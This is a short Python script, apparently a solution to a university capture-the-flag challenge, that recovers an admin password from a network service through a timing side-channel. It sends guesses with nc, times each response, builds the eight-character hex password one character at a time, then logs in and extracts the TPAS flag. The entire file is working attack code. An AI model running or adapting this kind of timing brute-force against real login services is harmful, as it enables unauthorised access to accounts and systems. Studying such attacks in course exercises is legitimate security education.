#!/usr/bin/env python3

import os
import re
import time

values = 'abcdef0123456789'
password = ''

i = 0

while i < 8:
    for j in range(len(values)):
        start_time = time.time()
        os.system(
            f'echo "admin\n{password + values[j]}" | nc tpas.alunos.dcc.fc.up.pt 5006 >/dev/null')
        elapsed_time = time.time() - start_time
        # print(f'{password + values[j]} -> {int(elapsed_time)} sec')

        if int(elapsed_time) == i + 1:
            i += 1
            password += values[j]
            break

print(f'Password: {password}')
print(os.popen('echo "admin\n"' + password +
               ' | nc tpas.alunos.dcc.fc.up.pt 5006 | grep -oE "TPAS{.+}"').read())
